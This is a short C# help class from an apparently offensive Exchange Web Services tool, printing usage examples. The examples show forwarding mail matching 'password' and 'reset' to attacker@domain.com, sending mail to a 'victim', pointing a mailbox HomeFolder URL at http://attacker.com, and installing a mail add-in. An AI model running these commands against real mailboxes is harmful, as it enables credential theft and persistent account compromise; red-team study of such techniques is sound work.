using System;

namespace EWS
{
    public class Help
    {
        public static void ShowExamples()
        {
            Console.WriteLine("  Examples:");
            Console.WriteLine("  Set auto-forward rules");
            Console.WriteLine("    ews -E user@domain.com -P Passw0rd! --rule -N TestRule -s password,reset -F attacker@domain.com");
            Console.WriteLine("  Send email");
            Console.WriteLine("    ews -E user@domain.com -P Passw0rd! --sendmail -R victim@domain.com -S \"Hello\" -T C:\\Users\\Rasta\\Desktop\\template.html");
            Console.WriteLine("  Set HomeFolder URL");
            Console.WriteLine("    ews -E user@domain.com -P Passw0rd! --homefolder -U http://attacker.com");
            Console.WriteLine("  Install MailApp");
            Console.WriteLine("    ews -E user@domain.com -P Passw0rd! --installapp -M C:\\Users\\Rasta\\Desktop\\manifest.xml");
        }
    }
}
